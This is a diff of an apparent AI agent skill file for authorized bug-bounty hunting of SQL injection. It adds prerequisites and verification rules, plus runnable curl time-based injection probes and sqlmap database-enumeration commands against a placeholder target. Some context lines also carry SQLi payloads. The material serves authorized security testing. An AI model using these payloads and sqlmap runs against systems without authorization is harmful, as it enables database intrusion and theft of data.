@@ -4,13 +4,45 @@ description: Hunting skill for sqli vulnerabilities. Built from 12 public bug bo
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [sql, injection, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [sql, injection, hunt, redteam]
+  category: redteam
 ---
 
 ## When to Use
 
 Use when the target has any endpoint that interacts with a database — search, filter, sort, login, ID-based lookups, API parameters, or any user input that could be used in a query. SQL injection (including NoSQL injection) remains one of the highest-paying vulnerability classes because it directly threatens data confidentiality, integrity, and availability. Every parameter in GET/POST/JSON/headers/cookies that reaches a backend database is a candidate. Highest-value targets: multi-tenant SaaS platforms, e-commerce/payment systems, search endpoints, analytics subdomains, and third-party plugins.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `mysql`, `sqlmap`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Baseline
+curl --max-time 30 --connect-timeout 10 -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test"
+
+# Inject
+curl --max-time 30 --connect-timeout 10 -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test' AND SLEEP(5)--"
+
+# SQLMap quick scan
+sqlmap -u "https://target.com/search?q=test" --dbs --level=3 --risk=2 --batch
+
+# SQLMap with POST
+sqlmap -u "https://target.com/api/filter" --data="category=electronics&sort=price" --dbs --batch
+
+# SQLMap with cookie auth
+sqlmap -u "https://target.com/admin/report" --cookie="session=TOKEN" --dbs --batch --level=5
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -144,7 +176,7 @@ admin'--
 ' AND SLEEP(5)--
 1; SELECT SLEEP(5)--
 
--- PostgreSQL  
+-- PostgreSQL
 '; SELECT pg_sleep(5)--
 1 AND (SELECT 1 FROM pg_sleep(5))--
 
@@ -396,30 +428,6 @@ The following real, verified bug-bounty / CVE / coordinated-disclosure cases ext
 
 ---
 
-## Verification
-
-Run this self-test to confirm sqli hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-sqli" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **Error-based SQLi without data extraction** — 500 errors with SQL fragments prove injection but not exploitability. Need data extraction, not just errors.
 - **Blind SQLi without data extraction** — boolean/time-based blind is harder to exploit but still valid. Demonstrate at least table name extraction.
@@ -428,8 +436,6 @@ All 3 tests verify the skill is properly structured and ready for use.
 - **NoSQL vs SQL confusion** — MongoDB `$gt`, `$ne` are NoSQL injection, not SQLi. Different attack class.
 
 ---
-
-## Related Skills & Chains
 
 ### Phase X — NUL Byte SQL Injection
 
@@ -452,6 +458,16 @@ Key indicators:
 - Target uses Firebird, PostgreSQL with `PDO::ATTR_EMULATE_PREPARES`, or legacy ODBC
 - Application calls `PDO::quote()` before `PDO::prepare()` (pattern: quote-then-prepare)
 - NUL byte in parameter causes query corruption even when quoting is "correct"
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
+
+---
 
 ## Related Skills & Chains
 
